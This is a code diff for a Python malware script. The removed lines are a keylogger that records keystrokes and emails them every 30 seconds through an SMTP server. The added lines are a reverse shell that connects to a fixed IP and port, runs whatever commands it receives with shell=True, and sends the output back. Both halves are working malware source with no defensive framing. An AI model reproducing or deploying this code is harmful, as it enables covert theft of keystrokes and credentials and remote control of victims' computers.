@@ -1,46 +1,43 @@
-import pynput.keyboard
-import smtplib
-import threading
+import socket
+import subprocess
+import json
 
-log = ""
-def callback_func(key):
-    global log
-    try:
-        log = log +str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + str(key)
-    except:
-        pass
-
-
-def send_mail(email,password,message):
-    try:
-        email_server = smtplib.SMTP_SSL('smtp.yandex.com.tr', 465)
-        email_server.login(email,password)
-        email_server.sendmail(email,email,message)
-        email_server.quit()
-        email_server.quit()
-    except:
-        pass
+class MySocket:
+	def __init__(self, ip, port):
+		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		self.my_connection.connect((ip,port))
 
 
 
-keylogger_listener = pynput.keyboard.Listener(on_press=callback_func)
+
+	def command_execution(self, command):
+		return subprocess.check_output(command, shell=True)
+
+	def json_send(self, data):
+		json_data = json.dumps(data)
+		self.my_connection.send(json_data.encode("utf-8"))
+
+	def json_receive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.my_connection.recv(1024).decode()
+				return json.loads(json_data)
+			except ValueError:
+				continue
 
 
-def threading_func():
-    global log
-    send_mail("XXXX@yandex.com", "PASSWORD",log.encode("utf-8"))
-    log=""
-    timer_object = threading.Timer(30,threading_func)
-    timer_object.start()
 
+	def start_socket(self):
 
+		while True:
 
-with keylogger_listener:
-    threading_func()
-    keylogger_listener.join()
+			command = self.json_receive()
+			command_output = self.command_execution(command.decode("utf-8"))
+			self.json_send(command_output)
+
+		self.my_connection.close()
+
+my_socketo = MySocket("192.168.1.113",8080)
+my_socketo.start_socket()
 
